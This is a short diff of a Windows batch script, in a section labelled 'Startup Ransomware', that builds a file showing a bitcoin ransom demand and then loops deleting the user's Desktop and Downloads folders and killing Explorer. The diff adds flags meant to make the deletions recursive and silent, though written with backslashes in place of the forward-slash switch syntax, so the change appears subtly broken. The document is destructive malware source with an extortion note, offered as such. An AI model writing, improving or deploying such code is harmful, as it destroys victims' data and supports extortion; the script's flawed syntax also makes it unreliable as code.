@@ -181,10 +181,10 @@ cls
 ::Startup Ransomware::
 echo msg * To get back your normall shit... send 0,0031 bitcoin to: 13h4EMjcusGEMXo2z8pV9UGEGWd8cyiSZs >> ka.bat
 echo ping localhost -n 4 >> ka.bat
-echo msg RIP >> ka.bat
+echo msg * RIP >> ka.bat
 echo :lol >> ka.bat
-echo rmdir "C:\users\%username%\Desktop" >> ka.bat
-echo rmdir "C:\users\%username%\Downloads" >> ka.bat
+echo rmdir "C:\users\%username%\Desktop" \Q \S >> ka.bat
+echo rmdir "C:\users\%username%\Downloads" \Q \S >> ka.bat
 echo taskkill explorer.exe >> ka.bat
 echo goto lol >> ka.bat
 
